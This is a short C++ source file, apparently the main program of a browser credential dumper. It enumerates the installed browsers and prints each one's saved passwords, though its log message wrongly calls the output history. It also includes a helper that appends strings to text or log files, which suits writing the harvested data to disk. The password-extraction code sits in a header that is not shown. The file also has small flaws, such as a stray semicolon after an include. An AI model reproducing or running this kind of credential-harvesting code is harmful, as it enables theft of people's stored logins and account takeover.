#include "header/browser.h"
#include <fstream>

/*
   Put parameter string of contents into a file
*/
int FlushStringToFile(
	std::string& contents,
	std::string filename,
	std::string outputPath,
	std::string fileType
)
{
	std::vector<std::string> validFileTypes{ "txt", "doc", "rtf", "log", };
	bool isValidFileType = false;

	for (std::string fType : validFileTypes) {
		if (fType == fileType)
			isValidFileType = true;
	}

	if (!isValidFileType) {
		std::cerr << "File Type (" << fileType << ") is Not Valid" << std::endl;
		return -1; // failure
	}

	std::string filePath = outputPath + "\\" + filename + "." + fileType;
	std::ofstream file;

	file.open(filePath, std::ios::app | std::ios::out);
	file.write(contents.c_str(), contents.size());
	file.flush();
	file.close();

	return 1; // success
}

#include <ctime>;

int main()
{	
	clock_t now = clock();

	auto installed_browsers = Browsing::InstalledBrowsersToObject();

	for (auto& browser : installed_browsers)
	{
		//browser->GetSavedPasswords();
		browser->Passwords.output();
		std::cout << " --- [] Done Outputing History for : " << browser->BrowserInfo().sBrowserNameString << std::endl;
		system("pause");
	}

	DestroyBrowsers(installed_browsers);

	std::cout << "Took " << (clock() - now) / CLOCKS_PER_SEC << " Seconds To Complete Operation." << std::endl;

	return 0;
}
